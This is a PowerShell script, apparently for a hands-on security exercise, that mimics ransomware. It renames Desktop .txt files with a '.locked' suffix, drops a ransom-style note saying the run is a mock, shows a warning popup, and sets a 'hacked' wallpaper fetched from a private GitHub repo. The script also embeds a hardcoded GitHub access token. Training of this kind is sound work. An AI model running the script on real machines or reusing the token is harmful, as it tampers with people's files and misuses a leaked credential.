
$desktop = [Environment]::GetFolderPath("Desktop")

# ファイル名変更（.locked 付与）
Get-ChildItem -Path $desktop -Filter *.txt | ForEach-Object {
    Rename-Item $_.FullName ($_.Name + ".locked")
}

# 警告メッセージ作成
$warning = @"
!!! ファイルは暗号化されました !!!

これは教育目的での模擬ランサムウェア実行です。
実際には暗号化されていませんが、ファイル名が変更されました。

速やかにインシデント対応チームへ連絡してください。

--- ハンズオン演習用デモ ---
"@
Set-Content -Path "$desktop\README_復号方法について.txt" -Value $warning

# 警告ポップアップ
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("ファイルは暗号化されました。復号方法を確認してください。", "ランサムウェア警告", 0, 'Warning')

# GitHub Private Repo から背景画像をダウンロード
$token = "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"
$apiUrl = "https://api.github.com/repos/cyberattackerdemo/main/contents/yourpcishacked.jpg"

$headers = @{
    Authorization = "token $token"
    "User-Agent" = "PowerShell"
}

$response = Invoke-RestMethod -Uri $apiUrl -Headers $headers
$content = [System.Convert]::FromBase64String($response.content)
$imagePath = "C:\Users\Public\ransom_bg.jpg"
[System.IO.File]::WriteAllBytes($imagePath, $content)

# 背景設定
Add-Type @"
using System.Runtime.InteropServices;
public class Wallpaper {
  [DllImport("user32.dll", SetLastError = true)]
  public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 3)
